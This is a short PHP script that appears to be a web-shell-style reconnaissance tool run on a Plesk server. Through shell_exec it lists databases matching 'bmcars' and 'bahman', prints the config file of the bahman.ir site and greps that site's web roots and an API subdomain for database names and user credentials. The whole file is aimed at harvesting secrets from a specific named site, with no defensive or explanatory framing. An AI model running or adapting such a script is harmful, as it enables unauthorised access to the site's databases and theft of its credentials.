<?php
echo "=== CHEVAL FIND ===\n";
# Try mysql via plesk db / credentials from domain
$cmds = [
  'plesk db -e "SHOW DATABASES LIKE \"%bmcars%\"" 2>&1',
  'plesk db -e "SHOW DATABASES LIKE \"%bahman%\"" 2>&1',
  'cat /var/www/vhosts/bahman.ir/httpdocs/libs/myconf.php 2>/dev/null | head -80',
  'grep -R "DB_NAME\\|dbname\\|bmcars_cms\\|DB_USER" /var/www/vhosts/bahman.ir/httpdocs/libs /var/www/vhosts/bahman.ir/httpdocs/ewcfg.php /var/www/vhosts/siteapi.bahman.ir/httpdocs 2>/dev/null | head -40',
];
foreach ($cmds as $c) {
  echo ">> $c\n".trim((string)shell_exec($c."\n"))."\n----\n";
}
